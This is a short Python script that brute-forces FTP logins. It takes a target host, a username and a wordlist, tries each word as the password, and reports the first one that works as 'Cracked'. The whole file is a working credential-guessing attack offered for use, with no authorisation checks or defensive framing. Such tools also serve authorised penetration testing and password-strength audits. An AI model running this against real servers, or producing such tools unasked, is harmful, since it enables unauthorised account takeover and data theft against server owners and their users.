from ftplib import FTP, Error
import argparse, sys, os.path
from socket import error


def check_args():
    parse = argparse.ArgumentParser()

    parse.add_argument('-w', '--wordlist', help='enter path to dictionary: -w my_dict.dic')
    parse.add_argument('-t', '--target', help='enter your target in format: -t targetsite.com')
    parse.add_argument('-u', '--username', help='enter username: -u my_account')

    args_list = parse.parse_args()

    return args_list


def validate(lst_args):
    if lst_args.target and lst_args.username:
        host = lst_args.target
        user = lst_args.username
    else:
        sys.exit('[!] Target and username cannot be blank. For help: ftp_brute -h')

    if os.path.isfile(str(lst_args.wordlist)):
        wordlist = lst_args.wordlist
    else:
        wordlist = 'words.dic'
    return host, user, wordlist


def brute(server, username, psw):
    try:
        with FTP(server) as ftp:
            if ftp.login(username, psw):
                sys.exit(f'[$] Cracked. {username}:{psw} [$]')

    except error:
        sys.exit('Invalid address')

    except Error:
        pass

    except KeyboardInterrupt:
        sys.exit('Ctrl-C pressed. Exiting...')


def main():
    c_args = check_args()

    host, user, wordlist = validate(c_args)

    print(f'[*] Connecting to {host}')

    with open(wordlist, 'r') as words:
        print('[!] Trying keys:')
        for word in words.readlines():

            print('[-] ' + word, end='')

            brute(host, user, word.strip())


if __name__ == '__main__':
    main()
